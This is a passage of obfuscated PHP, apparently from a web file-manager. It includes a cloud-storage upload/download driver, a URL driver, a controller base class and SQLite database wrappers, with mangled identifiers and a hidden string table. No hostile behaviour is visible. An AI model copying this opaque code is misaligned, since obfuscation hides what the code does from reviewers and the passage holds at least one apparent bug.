$this->ussRequest($äÂ±¡Ğ, $ÄàÇ–[240]); return $ü¿‹Ñ¢[$ÄàÇ–[1243]]; } $Ï­€œı® = $this->tempFile($this->pathThis($äÂ±¡Ğ)); file_put_contents($Ï­€œı®, $½êØ¨å¨); if ($this->upload($äÂ±¡Ğ, $Ï­€œı®)) { $this->tempFileRemve($Ï­€œı®); return !0; } return !1; } public function fileSubstr($ÍãˆİâŠ, $æ›Ê·Ó–, $’î¡øÒ‘) { $±ƒò»áë =& $_SERVER[”ôÑ§ì¸]; if (!($éÆ‰ü˜Ğ = $this->link($ÍãˆİâŠ))) { return !1; } $…ô¹µüĞ = !1; if ($’î¡øÒ‘ > 0) { $´íÄÑÃ¶ = $æ›Ê·Ó– + $’î¡øÒ‘ - 1; $…ô¹µüĞ = array($±ƒò»áë[1447] . $æ›Ê·Ó– . $±ƒò»áë[429] . $´íÄÑÃ¶); } $Šı¼õ¿ = url_request($éÆ‰ü˜Ğ, $±ƒò»áë[244], !1, $…ô¹µüĞ); return $Šı¼õ¿[$±ƒò»áë[772]] ? $Šı¼õ¿[$±ƒò»áë[1233]] : !1; } public function upload($…æäõùÀ, $—şûÇÒŞ, $¬ Ûİˆ÷ = false, $¨”–„¯è = REPEAT_REPLACE) { $£­ğµˆ× =& $_SERVER[”ôÑ§ì¸]; $˜Ë‹Î¥ª = IO::size($—şûÇÒŞ); if ($˜Ë‹Î¥ª <= 1024 * 1024 * 200) { $Û½ñ‡¶© = array($£­ğµˆ×[1487] . $—şûÇÒŞ); $şëùæò = $this->ussRequest($…æäõùÀ, $£­ğµˆ×[242], $Û½ñ‡¶©); return $şëùæò[$£­ğµˆ×[1243]] ? $this->getPathOuter($…æäõùÀ) : !1; } $Å¶†ğÓæ = 1024 * 1024 * 10; $ÖÈ ­¹Æ = array($£­ğµˆ×[1488], $£­ğµˆ×[1489] . $˜Ë‹Î¥ª, $£­ğµˆ×[1490], $£­ğµˆ×[1491] . $Å¶†ğÓæ); $şëùæò = $this->ussRequest($…æäõùÀ, $£­ğµˆ×[242], !1, $ÖÈ ­¹Æ); if (!$şëùæò[$£­ğµˆ×[1243]]) { return !1; } $ßËæçôÄ = $şëùæò[$£­ğµˆ×[1233]]; $–¶ş¬­Í = 0; $è‘ÚòË = $ßËæçôÄ[$£­ğµˆ×[1492]]; $œöà»ßí = fopen($—şûÇÒŞ, $£­ğµˆ×[1396]); if (!$œöà»ßí) { return !1; } do { $£ıá˜Óó = $ßËæçôÄ[$£­ğµˆ×[1493]]; fseek_64($œöà»ßí, $–¶ş¬­Í); $úÌºóÂ = fread($œöà»ßí, $£ıá˜Óó); $Ğ”Æ–¨Œ = 0; do { $Ğ”Æ–¨Œ++; $ßËæçôÄ = $this->uploadPart($…æäõùÀ, $ßËæçôÄ, $úÌºóÂ); } while (!$ßËæçôÄ && $Ğ”Æ–¨Œ < 3); if (!$ßËæçôÄ) { return !1; } $è‘ÚòË = $ßËæçôÄ[$£­ğµˆ×[1492]]; $–¶ş¬­Í += $£ıá˜Óó; } while ($è‘ÚòË != -1); fclose($œöà»ßí); $ÖÈ ­¹Æ = array($£­ğµˆ×[1494], $£­ğµˆ×[1495] . $ßËæçôÄ[$£­ğµˆ×[1496]], $£­ğµˆ×[1490]); $şëùæò = $this->ussRequest($…æäõùÀ, $£­ğµˆ×[242], !1, $ÖÈ ­¹Æ); return $şëùæò[$£­ğµˆ×[1243]] ? $this->getPathOuter($×è“°š·) : !1; } private function uploadPart($º—ºİÜ, $ë÷óéà­, &$çÃÎ™ä) { $ºÑã—Í´ =& $_SERVER[”ôÑ§ì¸]; $ïîÉ”Æ¸ = array($ºÑã—Í´[1497], $ºÑã—Í´[1495] . $ë÷óéà­[$ºÑã—Í´[1496]], $ºÑã—Í´[1498] . $ë÷óéà­[$ºÑã—Í´[1492]], $ºÑã—Í´[142] . $ë÷óéà­[$ºÑã—Í´[1493]]); $ıü©çúò = $this->ussRequest($º—ºİÜ, $ºÑã—Í´[242], $çÃÎ™ä, $ïîÉ”Æ¸); return !$ıü©çúò[$ºÑã—Í´[1243]] ? $ıü©çúò[$ºÑã—Í´[1243]] : $ıü©çúò[$ºÑã—Í´[1233]]; } public function uploadFormData($Í¨ëÕşú, $Å‰€éª = 3600) { return $this->uploadPolicy($Í¨ëÕşú, $Å‰€éª); } public function multiUploadFormData($ÇÌ–±†ø, $•»µÆÎ = 3600) { $ş˜ßûñå =& $_SERVER[”ôÑ§ì¸]; $…Å¸–“» = (int) $GLOBALS[$ş˜ßûñå[7]][$ş˜ßûñå[76]]; return $this->uploadPolicy($ÇÌ–±†ø, $•»µÆÎ, $…Å¸–“»); } private function uploadPolicy($ä§¸ˆª, $À•ãÉù = 3600, $ÀûÎñ§¨ = 0) { $å²÷¼ÆÁ =& $_SERVER[”ôÑ§ì¸]; $ÄÙ±”Â° = $å²÷¼ÆÁ[8] . $this->bucket; $§›îÃ = gmdate($å²÷¼ÆÁ[1432]); $–£Ïå­Ó = array($å²÷¼ÆÁ[1499] => $this->bucket, $å²÷¼ÆÁ[1500] => $ä§¸ˆª, $å²÷¼ÆÁ[1501] => time() + $À•ãÉù, $å²÷¼ÆÁ[1502] => $§›îÃ); if ($ÀûÎñ§¨) { $–£Ïå­Ó[$å²÷¼ÆÁ[1413]] = $ÀûÎñ§¨; } $åÀàéı¼ = base64_encode(json_encode($–£Ïå­Ó)); $¢Òüï« = base64_encode(hash_hmac($å²÷¼ÆÁ[1469], "\120\117\123\124\46{$ÄÙ±”Â°}\x26{$§›îÃ}\46{$åÀàéı¼}", md5("{$this->userpass}"), !0)); $å“ºÈÔÃ = array($å²÷¼ÆÁ[275] => $åÀàéı¼, $å²÷¼ÆÁ[1503] => "\x55\x50\x59\x55\x4e\x20{$this->username}\x3a{$¢Òüï«}", $å²÷¼ÆÁ[195] => $this->endpoint . $ÄÙ±”Â°); return $å“ºÈÔÃ; } public function download($ŞÓ²’, $Èùí§—) { $±¯£åÀÍ = IO::getPathInner(IO::mkfile($Èùí§—)); if (!($şíØê€ = $this->link($ŞÓ²’))) { return !1; } $¯¦Š²ŞÂ = 0; $˜±º®±Ğ = 1024 * 200; $£á¾ºŠÙ = fopen($±¯£åÀÍ, $_SERVER[”ôÑ§ì¸][1453]); while (!0) { $È”Ü¸Á = $this->fileSubstr($ŞÓ²’, $¯¦Š²ŞÂ, $˜±º®±Ğ); if ($È”Ü¸Á === !1) { return !1; } fwrite($£á¾ºŠÙ, $È”Ü¸Á); $¯¦Š²ŞÂ += $˜±º®±Ğ; if (strlen($È”Ü¸Á) < $˜±º®±Ğ) { break; } } fclose($£á¾ºŠÙ); return $Èùí§—; } public function link($ŠŞá†‰ğ, $ÖÄš¾©’ = array()) { $‰–‰Ğ´î =& $_SERVER[”ôÑ§ì¸]; $ŠŞá†‰ğ = trim($ŠŞá†‰ğ, $‰–‰Ğ´î[8]); if (!empty($this->token)) { $Ì­Â–ÎŒ = strtotime(date($‰–‰Ğ´î[1504])); $ŠÇ›“«– = substr(md5($this->token . $‰–‰Ğ´î[327] . $Ì­Â–ÎŒ . $‰–‰Ğ´î[1505] . $ŠŞá†‰ğ), 12, 8) . $Ì­Â–ÎŒ; $ÖÄš¾©’[] = $‰–‰Ğ´î[1506] . $ŠÇ›“«–; } $¾İ°Ê¯ = !empty($ÖÄš¾©’) ? $‰–‰Ğ´î[73] . implode($‰–‰Ğ´î[327], $ÖÄš¾©’) : $‰–‰Ğ´î[12]; return $this->getHost() . $‰–‰Ğ´î[8] . $ŠŞá†‰ğ . $¾İ°Ê¯; } public function fileOut($…†äò°, $ê¹Ğ»£î = false, $Œúç³¦… = false, $ ä€Ñà£ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($…†äò°, $ê¹Ğ»£î, $Œúç³¦…, $ ä€Ñà£); } if (!$Œúç³¦…) { $Œúç³¦… = $this->pathThis($…†äò°); } $Â¦àË–à = $ê¹Ğ»£î ? array($_SERVER[”ôÑ§ì¸][1507] . rawurlencode($Œúç³¦…)) : array(); $ ª­‡Ÿ‘ = $this->link($…†äò°, $Â¦àË–à); $this->fileOutLink($ ª­‡Ÿ‘); } public function fileOutServer($İ¾¾ï–á, $¼Ò„Ú¿‘ = false, $„“Àºíü = false, $³øÖ¬¾¨ = '') { parent::fileOut($İ¾¾ï–á, $¼Ò„Ú¿‘, $„“Àºíü, $³øÖ¬¾¨); } public function fileOutImage($şóÚ¸†, $íÓÅºÅø = 250) { $¨Øµ‹Ôˆ = $this->link($şóÚ¸† . $_SERVER[”ôÑ§ì¸][1508] . $íÓÅºÅø); $this->fileOutLink($¨Øµ‹Ôˆ); } public function fileOutImageServer($Ø—ØÄùù, $ÊÓºòÓî = 250) { parent::fileOutImage($Ø—ØÄùù, $ÊÓºòÓî); } public function hashMd5($ª€¾©ğì) { $…–ûÅâ =& $_SERVER[”ôÑ§ì¸]; $ç¦ÊùŸ² = $this->_objectMeta($ª€¾©ğì); return isset($ç¦ÊùŸ²[$…–ûÅâ[227]]) ? $ç¦ÊùŸ²[$…–ûÅâ[227]] : !1; } public function size($ãÌĞ»”) { $üÏ€ä™ = $this->objectMeta($ãÌĞ»”); return $üÏ€ä™ ? $üÏ€ä™[$_SERVER[”ôÑ§ì¸][76]] : 0; } public function info($‡ñ’Ê) { if ($this->isFolder($‡ñ’Ê)) { return $this->folderInfo($‡ñ’Ê); } else { if ($this->isFile($‡ñ’Ê)) { return $this->fileInfo($‡ñ’Ê); } } return !1; } public function exist($şÌÁş²ı) { return $this->isFile($şÌÁş²ı) || $this->isFolder($şÌÁş²ı); } public function isFile($íÌ¸€ç) { return !$this->isFolder($íÌ¸€ç) && $this->objectMeta($íÌ¸€ç); } public function isFolder($ÆÅì–¹‹) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][165], $ÆÅì–¹‹); } protected function objectMeta($şÄË»õ¢) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][167], $şÄË»õ¢); } protected function _objectMeta($ù„¬èø) { $ŠĞ‡Ÿµú =& $_SERVER[”ôÑ§ì¸]; if ($ù„¬èø == $ŠĞ‡Ÿµú[12] || $ù„¬èø == $ŠĞ‡Ÿµú[8]) { return array(); } $ïæ£âªÛ = $this->ussRequest($ù„¬èø, $ŠĞ‡Ÿµú[1509]); if (!$ïæ£âªÛ[$ŠĞ‡Ÿµú[1243]]) { return null; } $ïì˜èÁ² = isset($ïæ£âªÛ[$ŠĞ‡Ÿµú[1233]]) ? $ïæ£âªÛ[$ŠĞ‡Ÿµú[1233]] : array(); if (!isset($ïì˜èÁ²[$ŠĞ‡Ÿµú[1510]])) { return null; } $İ°úØˆ¡ = array($ŠĞ‡Ÿµú[33] => isset($ïì˜èÁ²[$ŠĞ‡Ÿµú[1510]]) ? $ïì˜èÁ²[$ŠĞ‡Ÿµú[1510]] : null, $ŠĞ‡Ÿµú[76] => isset($ïì˜èÁ²[$ŠĞ‡Ÿµú[1511]]) ? $ïì˜èÁ²[$ŠĞ‡Ÿµú[1511]] : null, $ŠĞ‡Ÿµú[227] => isset($ïì˜èÁ²[$ŠĞ‡Ÿµú[1512]]) ? $ïì˜èÁ²[$ŠĞ‡Ÿµú[1512]] : null, $ŠĞ‡Ÿµú[1479] => isset($ïì˜èÁ²[$ŠĞ‡Ÿµú[1513]]) ? $ïì˜èÁ²[$ŠĞ‡Ÿµú[1513]] : null); $İ°úØˆ¡[$ŠĞ‡Ÿµú[1480]] = isset($ïì˜èÁ²[$ŠĞ‡Ÿµú[1514]]) ? strtotime($ïì˜èÁ²[$ŠĞ‡Ÿµú[1514]]) : $İ°úØˆ¡[$ŠĞ‡Ÿµú[1479]]; return $İ°úØˆ¡; } protected function _isFolder($úáÆ„û) { $°Ì€÷³à =& $_SERVER[”ôÑ§ì¸]; if ($úáÆ„û == $°Ì€÷³à[12] || $úáÆ„û == $°Ì€÷³à[8]) { return !0; } $Ïƒ—Ú˜ò = $this->_objectMeta($úáÆ„û); return isset($Ïƒ—Ú˜ò[$°Ì€÷³à[33]]) && $Ïƒ—Ú˜ò[$°Ì€÷³à[33]] == $°Ì€÷³à[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($©İÍ’´ì = false) { } public function exist($÷´»»òÚ) { $ıÌƒ®Ï = $this->info($÷´»»òÚ); return $ıÌƒ®Ï[$_SERVER[”ôÑ§ì¸][215]]; } public function isFile($ö¦ã“) { $¾ëª¿Î· = $this->info($ö¦ã“); return $¾ëª¿Î·[$_SERVER[”ôÑ§ì¸][215]]; } public function isFolder($÷íŒ£·) { return !1; } public function size($„ÛõŠ») { $œ¢±êê‘ = $this->info($„ÛõŠ»); return $œ¢±êê‘[$_SERVER[”ôÑ§ì¸][76]]; } public function info($šóÚ¶š) { return $this->infoParse($šóÚ¶š); } public function infoAuth($‡äé¢‚‘) { return $this->infoParse($‡äé¢‚‘); } public function infoWithChildren($¸£íÈœÁ) { return $this->infoParse($¸£íÈœÁ); } public function infoFull($Ñ¼½ï‘Ã) { return $this->infoParse($Ñ¼½ï‘Ã); } private function infoParse($Ã—ìœÒ) { $…µ”®×¾ =& $_SERVER[”ôÑ§ì¸]; $ôãÒÛ  = $this->header($Ã—ìœÒ); if (!$ôãÒÛ  || !$ôãÒÛ [$…µ”®×¾[772]]) { return !1; } $¤ŠÆßµı = _get($ôãÒÛ , $…µ”®×¾[380], 0); $ŞÆ¿ŠŸ¸ = array($…µ”®×¾[32] => $ôãÒÛ [$…µ”®×¾[32]], $…µ”®×¾[84] => $Ã—ìœÒ, $…µ”®×¾[33] => $…µ”®×¾[213], $…µ”®×¾[76] => intval($¤ŠÆßµı), $…µ”®×¾[174] => get_path_ext($ôãÒÛ [$…µ”®×¾[32]]), $…µ”®×¾[1393] => $¤ŠÆßµı > 0 && $ôãÒÛ [$…µ”®×¾[1515]], $…µ”®×¾[1394] => !1); return $ŞÆ¿ŠŸ¸; } private function header($Å¬„üä) { $Öûµª¬Ë =& $_SERVER[”ôÑ§ì¸]; if (isset(self::$_cacheHeader[$Å¬„üä])) { return self::$_cacheHeader[$Å¬„üä]; } $Ì·Ó±¯ = isset($GLOBALS[$Öûµª¬Ë[1516]]) ? $GLOBALS[$Öûµª¬Ë[1516]] : !1; $GLOBALS[$Öûµª¬Ë[1516]] = !0; self::$_cacheHeader[$Å¬„üä] = url_header($Å¬„üä); $GLOBALS[$Öûµª¬Ë[1516]] = $Ì·Ó±¯; return self::$_cacheHeader[$Å¬„üä]; } public function hashSimple($®ÃŞ—ûˆ, $ùÙŠ·Åâ = false) { $½ø®Ô =& $_SERVER[”ôÑ§ì¸]; $’¾ıˆ€í = $this->info($®ÃŞ—ûˆ); if (!$’¾ıˆ€í || !$’¾ıˆ€í[$½ø®Ô[215]]) { return !1; } $ğÖÒÊ’ = $’¾ıˆ€í[$½ø®Ô[76]]; $šßœÃÌ = 200; $ˆòÅ„–Œ = 50; if ($ğÖÒÊ’ <= $šßœÃÌ * $ˆòÅ„–Œ) { return md5($this->fileSubstr($®ÃŞ—ûˆ, 0, $ğÖÒÊ’)) . $ğÖÒÊ’; } $Öîüß€ = intval($ğÖÒÊ’ / $ˆòÅ„–Œ); $á¢ß½•µ = $½ø®Ô[12]; $ÂÃ¶úÊ‰ = timeFloat(); $‰Û–˜¡¾ = 15; for ($é÷ƒÏ¦  = 0; $é÷ƒÏ¦  < $ˆòÅ„–Œ; $é÷ƒÏ¦ ++) { if (timeFloat() - $ÂÃ¶úÊ‰ > $‰Û–˜¡¾) { return !1; } $®†›–Ş = $this->fileSubstr($®ÃŞ—ûˆ, $Öîüß€ * $é÷ƒÏ¦ , $šßœÃÌ); if (!$®†›–Ş) { return !1; } $á¢ß½•µ .= $®†›–Ş; } $á¢ß½•µ .= $this->fileSubstr($®ÃŞ—ûˆ, $ğÖÒÊ’ - $šßœÃÌ, $šßœÃÌ); return md5($á¢ß½•µ) . $ğÖÒÊ’; } public function getContent($÷ñİñÄõ) { return $this->fileSubstr($÷ñİñÄõ); } public function fileSubstr($„ÓÈ»Êî, $óùšŞ¥Á = 0, $å¥šæÎÆ = -1) { $–¶‘Œ½Å =& $_SERVER[”ôÑ§ì¸]; $ÎŞ’¥çú = $this->info($„ÓÈ»Êî); if (!$ÎŞ’¥çú || !$ÎŞ’¥çú[$–¶‘Œ½Å[215]] && $ÎŞ’¥çú[$–¶‘Œ½Å[76]] > 1024 * 1024 * 10) { return !1; } if ($å¥šæÎÆ === -1) { $å¥šæÎÆ = $ÎŞ’¥çú[$–¶‘Œ½Å[76]]; } if ($å¥šæÎÆ == 0) { return $–¶‘Œ½Å[12]; } $µ—¨¨ˆ = array($–¶‘Œ½Å[1517] . $óùšŞ¥Á . $–¶‘Œ½Å[804] . ($óùšŞ¥Á + $å¥šæÎÆ - 1)); $££Ç»±Å = url_request($„ÓÈ»Êî, $–¶‘Œ½Å[244], !1, $µ—¨¨ˆ, !1, !1, 30); return $££Ç»±Å[$–¶‘Œ½Å[1233]] ? $££Ç»±Å[$–¶‘Œ½Å[1233]] : $–¶‘Œ½Å[12]; } public function download($ÆÏÅ˜ˆ×, $š½ñ½Ö©) { Downloader::start($ÆÏÅ˜ˆ×, $š½ñ½Ö©); return $š½ñ½Ö©; } } goto CÇ®ºÕÚŞ; cÙ†¡ÏÓ‡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ğ•²şÊË =& $_SERVER[”ôÑ§ì¸]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ğ•²şÊË[6]] =& $config; $this->values[$Ğ•²şÊË[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ğ•²şÊË[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($åœ˜–ªÇ) { if (1 === func_num_args()) { $this->{$åœ˜–ªÇ} = new $åœ˜–ªÇ(); } else { $¬¨à÷¨ = new ReflectionClass($åœ˜–ªÇ); $¦ËñîˆÓ = func_get_args(); array_shift($¦ËñîˆÓ); $this->{$åœ˜–ªÇ} = $¬¨à÷¨->newInstanceArgs($¦ËñîˆÓ); } return $this->{$åœ˜–ªÇ}; } public function routeBind($•ãå¤œ, $­ÅŠÜÓè, $»õÑ…ÏÁ = 3) { $æ©‘ø² =& $_SERVER[”ôÑ§ì¸]; $íóÀ»õ = $this->in[$æ©‘ø²[9]]; $•ãå¤œ = str_replace($æ©‘ø²[10], $æ©‘ø²[11], trim(trim($•ãå¤œ, $æ©‘ø²[8]), $æ©‘ø²[12])); if (!$•ãå¤œ || count($íóÀ»õ) <= $»õÑ…ÏÁ) { return !1; } $„¾¿íœâ = !0; $¡Ğè¯ = explode($æ©‘ø²[8], $•ãå¤œ); for ($ÔÌ¤’Ó‰ = 0; $ÔÌ¤’Ó‰ < count($¡Ğè¯); $ÔÌ¤’Ó‰++) { if ($¡Ğè¯[$ÔÌ¤’Ó‰] != $íóÀ»õ[$»õÑ…ÏÁ + $ÔÌ¤’Ó‰]) { $„¾¿íœâ = !1; break; } } if (!$„¾¿íœâ) { return; } call_user_func_array(array($this, $­ÅŠÜÓè), array()); } public function routeArgs($€çÂ“åÁ = 3) { $ì Ü§¤Ê = $this->in[$_SERVER[”ôÑ§ì¸][9]]; if (count($ì Ü§¤Ê) <= $€çÂ“åÁ) { return array(); } $›ÚÓòä¸ = array(); for ($›¿Ë¤÷ = $€çÂ“åÁ; $›¿Ë¤÷ < count($ì Ü§¤Ê); $›¿Ë¤÷ += 2) { $›ÚÓòä¸[$ì Ü§¤Ê[$›¿Ë¤÷]] = $ì Ü§¤Ê[$›¿Ë¤÷ + 1]; $this->in[$ì Ü§¤Ê[$›¿Ë¤÷]] = $ì Ü§¤Ê[$›¿Ë¤÷ + 1]; } return $›ÚÓòä¸; } protected function assign($Ã³»æ, $¢™ñÙ›Ä) { $this->values[$Ã³»æ] = $¢™ñÙ›Ä; } protected function display($÷–Á“Ê×) { ob_end_clean(); extract($this->values); require $this->tpl . $÷–Á“Ê×; } } class DbSqliteBase extends Db { public function __construct($õôàê¥Â = '') { $ÈŠ’…»ş =& $_SERVER[”ôÑ§ì¸]; if (!extension_loaded($ÈŠ’…»ş[13])) { think_exception(think_lang($ÈŠ’…»ş[14]) . $ÈŠ’…»ş[15]); } if (!empty($õôàê¥Â)) { if (!isset($õôàê¥Â[$ÈŠ’…»ş[16]])) { $õôàê¥Â[$ÈŠ’…»ş[16]] = 438; } $this->config = $õôàê¥Â; if (empty($this->config[$ÈŠ’…»ş[17]])) { $this->config[$ÈŠ’…»ş[17]] = array(); } } } public function connect($ìöŠ–¾ = '', $¬‚ó¹Ÿ” = 0) { $ŠéëÍ”” =& $_SERVER[”ôÑ§ì¸]; if (!isset($this->linkID[$¬‚ó¹Ÿ”])) { if (empty($ìöŠ–¾)) { $ìöŠ–¾ = $this->config; } $·¸ˆóáÜ = !empty($ìöŠ–¾[$ŠéëÍ””[17]][$ŠéëÍ””[18]]) ? $ìöŠ–¾[$ŠéëÍ””[17]][$ŠéëÍ””[18]] : $this->pconnect; $ºòºæ = $·¸ˆóáÜ ? $ŠéëÍ””[19] : $ŠéëÍ””[20]; $this->linkID[$¬‚ó¹Ÿ”] = $ºòºæ($ìöŠ–¾[$ŠéëÍ””[21]], $ìöŠ–¾[$ŠéëÍ””[16]]); if (!$this->linkID[$¬‚ó¹Ÿ”]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¬‚ó¹Ÿ”], 30000); if (1 != think_config($ŠéëÍ””[22])) { unset($this->config); } } return $this->linkID[$¬‚ó¹Ÿ”]; } public function free() { $this->queryID = null; } public function query($ŠŸÑÙï±) { $©¹˜èúş =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ŠŸÑÙï±; if ($this->queryID) { $this->free(); } think_action_status($©¹˜èúş[23], 1); think_status($©¹˜èúş[24]); $this->queryID = sqlite_query($this->_linkID, $ŠŸÑÙï±); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $–‘ãÔû = $this->getAll(); return $–‘ãÔû; } } public function execute($ïğŸ§×„) { $ÌÖŸİ­Í =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ïğŸ§×„; if ($this->queryID) { $this->free(); } think_action_status($ÌÖŸİ­Í[25], 1); think_status($ÌÖŸİ­Í[24]); $Ù²é†Èˆ = sqlite_exec($this->_linkID, $ïğŸ§×„); $this->debug(); if (!1 === $Ù²é†Èˆ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[”ôÑ§ì¸][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $öÛÅä›ò = sqlite_query($this->_linkID, $_SERVER[”ôÑ§ì¸][27]); if (!$öÛÅä›ò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $µ¼Î’Ëæ = sqlite_query($this->_linkID, $_SERVER[”ôÑ§ì¸][28]); if (!$µ¼Î’Ëæ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¼¯«Öß = array(); if ($this->numRows > 0) { for ($úÃ¹ó = 0; $úÃ¹ó < $this->numRows; $úÃ¹ó++) { $¼¯«Öß[$úÃ¹ó] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¼¯«Öß; } public function getFields($¿ĞÛúò) { $ú×—Üã‹ =& $_SERVER[”ôÑ§ì¸]; $ª‰¡Ëö× = $this->query($ú×—Üã‹[29] . $¿ĞÛúò . $ú×—Üã‹[30]); $ø¾°˜¿¡ = array(); if ($ª‰¡Ëö×) { foreach ($ª‰¡Ëö× as $é§õÏÈ‘ => $µ¤‹Ä©ô) { $ø¾°˜¿¡[$µ¤‹Ä©ô[$ú×—Üã‹[31]]] = array($ú×—Üã‹[32] => $µ¤‹Ä©ô[$ú×—Üã‹[31]], $ú×—Üã‹[33] => $µ¤‹Ä©ô[$ú×—Üã‹[34]], $ú×—Üã‹[35] => (bool) ($µ¤‹Ä©ô[$ú×—Üã‹[36]] === $ú×—Üã‹[12]), $ú×—Üã‹[37] => $µ¤‹Ä©ô[$ú×—Üã‹[38]], $ú×—Üã‹[39] => strtolower($µ¤‹Ä©ô[$ú×—Üã‹[40]]) == $ú×—Üã‹[41], $ú×—Üã‹[42] => strtolower($µ¤‹Ä©ô[$ú×—Üã‹[43]]) == $ú×—Üã‹[44]); } } return $ø¾°˜¿¡; } public function getTables($Õ¶Èßø” = '') { $äíÍ“© =& $_SERVER[”ôÑ§ì¸]; $ËöôÚ­í = $this->query($äíÍ“©[45] . $äíÍ“©[46] . $äíÍ“©[47]); $º©ÑİÁÒ = array(); foreach ($ËöôÚ­í as $›œæÈÎ‡ => $«†à“¤–) { $º©ÑİÁÒ[$›œæÈÎ‡] = current($«†à“¤–); } return $º©ÑİÁÒ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $é Ì§ç =& $_SERVER[”ôÑ§ì¸]; $¨«äÇ· = sqlite_last_error($this->_linkID); $this->error = $¨«äÇ· . $é Ì§ç[4] . sqlite_error_string($¨«äÇ·); if ($é Ì§ç[12] != $this->queryStr) { $this->error .= LNG($é Ì§ç[48]) . $this->queryStr; } think_trace($this->error, $é Ì§ç[12], $é Ì§ç[49]); return $this->error; } public function escapeString($†´¥’Ô) { return sqlite_escape_string($†´¥’Ô); } public function parseLimit($ÄØÆçœî) { $Î½Óé×˜ =& $_SERVER[”ôÑ§ì¸]; $›Ïàè³Ò = $Î½Óé×˜[12]; if (!empty($ÄØÆçœî)) { $ÄØÆçœî = explode($Î½Óé×˜[50], $ÄØÆçœî); if (count($ÄØÆçœî) > 1) { $›Ïàè³Ò .= $Î½Óé×˜[51] . $ÄØÆçœî[1] . $Î½Óé×˜[52] . $ÄØÆçœî[0] . $Î½Óé×˜[53]; } else { $›Ïàè³Ò .= $Î½Óé×˜[51] . $ÄØÆçœî[0] . $Î½Óé×˜[53]; } } return $›Ïàè³Ò; } } class DbSqlite3Base extends Db { public function __construct($¯¸ÎÄØš = '') { $·ßÇûŠÃ =& $_SERVER[”ôÑ§ì¸]; if (!class_exists($·ßÇûŠÃ[54])) { think_exception(think_lang($·ßÇûŠÃ[14]) . $·ßÇûŠÃ[55]); } if (!empty($¯¸ÎÄØš)) { if (!isset($¯¸ÎÄØš[$·ßÇûŠÃ[16]])) { $¯¸ÎÄØš[$·ßÇûŠÃ[16]] = 438; } $this->config = $¯¸ÎÄØš; if (empty($this->config[$·ßÇûŠÃ[17]])) { $this->config[$·ßÇûŠÃ[17]] = array(); } } } public function connect($Ôì±áÏ¯ = '', $İıÍ¥™Ç = 0) { $ñœé¤¨³ =& $_SERVER[”ôÑ§ì¸]; if (!isset($this->linkID[$İıÍ¥™Ç])) { if (empty($Ôì±áÏ¯)) { $Ôì±áÏ¯ = $this->config; } $this->linkID[$İıÍ¥™Ç] = new SQLite3($Ôì±áÏ¯[$ñœé¤¨³[21]]); if (!$this->linkID[$İıÍ¥™Ç]) { think_exception($this->linkID[$İıÍ¥™Ç]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$İıÍ¥™Ç]->busyTimeout(30000); if (1 != think_config($ñœé¤¨³[22])) { unset($this->config); } } return $this->linkID[$İıÍ¥™Ç]; } public function free() { $this->queryID = null; } public function query($ÜÒ†ë) { $Ú­Ó—ö‹ =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÜÒ†ë; if ($this->queryID) { $this->free(); } think_action_status($Ú­Ó—ö‹[23], 1); think_status($Ú­Ó—ö‹[24]); $this->queryID = $this->_linkID->query($ÜÒ†ë); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $«€ƒï‚´ = $this->getAll(); $this->numRows = count($«€ƒï‚´); return $«€ƒï‚´; } } public function execute($ªç¦İÊ) { $õ¼¤°™Ç =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ªç¦İÊ; if ($this->queryID) { $this->free(); } think_action_status($õ¼¤°™Ç[25], 1); think_status($õ¼¤°™Ç[24]); $¸ÊÙ©Üœ = $this->_linkID->exec($ªç¦İÊ); $this->debug(); if (!1 === $¸ÊÙ©Üœ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[”ôÑ§ì¸][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¶¯Ê®Ë = $this->_linkID->query($_SERVER[”ôÑ§ì¸][27]); if (!$¶¯Ê®Ë) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Æõ–ÔÃ€ = $this->_linkID->query($_SERVER[”ôÑ§ì¸][28]); if (!$Æõ–ÔÃ€) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $šÜõí²À = array(); while ($¦Ší±¶Ê = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $šÜõí²À[] = $¦Ší±¶Ê; } $this->queryID->reset(); return $šÜõí²À; } public function getFields($øã·‰) { $Êàûá•‡ =& 